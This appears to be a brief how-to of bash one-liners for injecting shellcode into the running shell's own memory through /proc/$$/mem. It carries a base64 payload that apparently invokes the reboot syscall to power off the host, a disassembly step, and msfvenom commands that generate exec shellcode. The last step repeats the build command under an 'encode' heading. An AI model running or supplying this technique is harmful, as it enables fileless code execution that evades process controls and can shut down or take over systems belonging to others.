

# run shellcode in bash:
```bash
dd of=/proc/$$/mem bs=1 seek=$(($(cut -d" " -f9</proc/$$/syscall))) if=<base64 -d<<<utz+IUO+aRkSKL+t3uH+McCwqQ8F) conv=notrunc
```
# decode it
```bash
base64 -d<<<utz+IUO+aRkSKL+t3uH+McCwqQ8F | ndisasm
```
# build shell code
```bash
msfvenom -p linux/x64/exec CMD='whoami'
```
# base64 encode shell code
```bash
msfvenom -p linux/x64/exec CMD='whoami'
```
